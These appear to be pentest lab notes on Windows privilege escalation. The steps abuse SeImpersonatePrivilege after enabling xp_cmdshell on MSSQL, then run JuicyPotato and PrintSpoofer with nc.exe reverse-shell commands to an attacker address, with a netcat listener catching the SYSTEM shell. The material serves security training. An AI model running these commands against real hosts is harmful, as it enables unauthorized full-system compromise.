
---
### SeImpersonate
#### JuicyPotato
We have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.
```bash
hcx05@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
#-windows-auth: When the ID is a Windows user.
```

```sql
SQL> enable_xp_cmdshell 

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```
Confirming Access
```sql
SQL> xp_cmdshell whoami 

output 

--------------------------------------------------------------------

nt service\mssql$sqlexpress01
```
Checking Account Privileges
```sql
SQL> xp_cmdshell whoami /priv 

SeImpersonatePrivilege Impersonate a client after authentication Enable
```
[JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` 
privileges via DCOM/NTLM reflection abuse.
```sql
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t * 
-- -p: Create a process using this identity.
-- -a "...": Argument that will pass to the process we've just created.
-- /c: Tell cmd to stop while the argument is done.
-- -t: CreateProcessWithTokenW, needs SeImpersonate
-- -t *: Try all ways to get promoted.

output 

--------------------------------------------------------------------

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375 
[+] authresult 0 
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM 
[+] CreateProcessWithTokenW OK 
[+] calling 0x000000000088ce08
```
Catching SYSTEM Shell
```bash
hcx05@htb[/htb]$ sudo nc -lnvp 8443
```
#### PrintSpoofer and RoguePotato
uicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.

[PrintSpoofer blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
#### Escalating Privileges using PrintSpoofer
```cql
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```





















